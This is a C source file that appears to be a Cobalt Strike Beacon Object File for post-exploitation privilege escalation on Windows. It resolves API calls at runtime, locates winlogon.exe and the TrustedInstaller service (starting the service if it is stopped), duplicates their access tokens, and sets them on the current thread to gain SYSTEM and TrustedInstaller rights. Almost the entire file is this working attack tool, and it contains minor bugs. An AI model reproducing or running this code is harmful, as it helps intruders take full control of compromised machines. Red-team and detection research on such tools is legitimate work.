#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "beacon.h"

#define DEBUG FALSE

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);


FARPROC Resolver(CHAR *lib, CHAR *func);
DWORD GetProcByPID(CHAR *name);
DWORD GetTrustedInstallerPID();
BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage);
BOOL ElevateSystem(HANDLE *);
BOOL ElevateTrustedInstaller(HANDLE *);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    if(DEBUG) {
	    printf("[%s] %s!%s at 0x%p\n", __func__, lib, func, ptr);
    }
	return ptr;
}

DWORD GetProcByPID(CHAR *name) {
    FARPROC CreateToolhelp32Snapshot = Resolver("kernel32.dll", "CreateToolhelp32Snapshot");
    FARPROC Process32First = Resolver("kernel32.dll", "Process32First");
    FARPROC Process32Next = Resolver("kernel32.dll", "Process32Next");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");
    FARPROC strcmp = Resolver("msvcrt.dll", "strcmp");

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
        if(strcmp(pe32.szExeFile, name) == 0) {
            PID = pe32.th32ProcessID;
            printf("[%s] Process %s PID is %d\n", __func__, name, PID);
            break;
        }
        } while(Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return PID;
}

DWORD GetTrustedInstallerPID() {
    FARPROC OpenSCManager = Resolver("advapi32.dll", "OpenSCManagerA");
    FARPROC OpenService = Resolver("advapi32.dll", "OpenServiceA");
    FARPROC QueryServiceStatusEx = Resolver("advapi32.dll", "QueryServiceStatusEx");
    FARPROC StartService = Resolver("advapi32.dll", "StartServiceA");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");
    FARPROC SleepEx = Resolver("kernel32.dll", "SleepEx");

    DWORD PID = 0;
    SC_HANDLE schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);

    if(schManager == NULL) {
        printf("[%s] OpenSCManager failed. Error: %d\n", __func__, GetLastError());
        return FALSE;
    }

    SC_HANDLE schService = OpenService(schManager, "TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);

     if(schManager == NULL) {
        printf("[%s] OpenService failed. Error: %d\n", __func__, GetLastError());
        CloseHandle(schManager);
        return FALSE;
    }  
    CloseHandle(schManager);

    SERVICE_STATUS_PROCESS ssp;
    DWORD dwSize = 0;

    while(QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
        printf("[%s] QueryServiceStatusEx need %d bytes.\n", __func__, dwSize);
        if(ssp.dwCurrentState == SERVICE_STOPPED) {
            if(!StartService(schService, 0, NULL)) {
                printf("[%s] StartService failed. Error: %d\n", __func__, GetLastError());
                CloseHandle(schService);
                return FALSE; 
            }
        }
        if(ssp.dwCurrentState == SERVICE_RUNNING) {
            PID = ssp.dwProcessId;
            printf("[%s] TrustedInstaller Service PID is %d\n", __func__, PID);
            break;
        }
        SleepEx(5000, FALSE);
    }

    CloseHandle(schService); 
    return PID;
}

BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage) {
    FARPROC OpenProcess = Resolver("kernel32.dll", "OpenProcess");
    FARPROC OpenProcessToken = Resolver("kernel32.dll", "OpenProcessToken");
    FARPROC DuplicateTokenEx = Resolver("advapi32.dll", "DuplicateTokenEx");
    FARPROC ImpersonateLoggedOnUser = Resolver("advapi32.dll", "ImpersonateLoggedOnUser");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);

    if(hProc == NULL) {
        printf("[%s] OpenProcess on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if(!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        printf("[%s] OpenProcessToken on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    CloseHandle(hProc);
    
    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {
        printf("[%s] DuplicateTokenEx on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hToken);
        return FALSE;       
    }
    CloseHandle(hToken);

    if(!ImpersonateLoggedOnUser(hDup)) {
        printf("[%s] ImpersonateLoggedOnUser on PID %d failed. Error: %d\n", __func__, PID, GetLastError());
        CloseHandle(hDup);
        return FALSE;            
    }

    *hStorage = hDup;

    return TRUE;
}

BOOL ElevateSystem(HANDLE *hTokenSystem) {
    DWORD PID = GetProcByPID("winlogon.exe");
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenSystem)) {
            printf("[%s] ImpersonateByPID(SYSTEM) succeeded.\n", __func__);
        }
    }
}

BOOL ElevateTrustedInstaller(HANDLE *hTokenTrustedInstaller) {
    DWORD PID = GetTrustedInstallerPID();
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenTrustedInstaller)) {
            printf("[%s] ImpersonateByPID(TrustedInstaller) succeeded.\n", __func__);
        }
    }
}

int go() {
    HANDLE hTokenSystem = NULL;
    HANDLE hTokenTrustedInstaller = NULL;

    FARPROC SetThreadToken = Resolver("kernel32.dll", "SetThreadToken");
    FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
    
    ElevateSystem(&hTokenSystem);
    ElevateTrustedInstaller(&hTokenTrustedInstaller);

    printf("[%s] (SYSTEM) Token HANDLE 0x%p.\n", __func__, hTokenSystem);
    printf("[%s] (TrustedInstaller) Token HANDLE 0x%p.\n", __func__, hTokenTrustedInstaller);
    
    if(!SetThreadToken(NULL, hTokenSystem)) {
        printf("[%s] (SYSTEM) SetThreadToken failed. Error: %d.\n", __func__, GetLastError());       
    }
    
    if(hTokenTrustedInstaller != NULL) {
        if(!SetThreadToken(NULL, hTokenTrustedInstaller)) {
            printf("[%s] (TrustedInstaller) SetThreadToken failed. Error: %d.\n", __func__, GetLastError());       
        }
    }

    return 0;
}
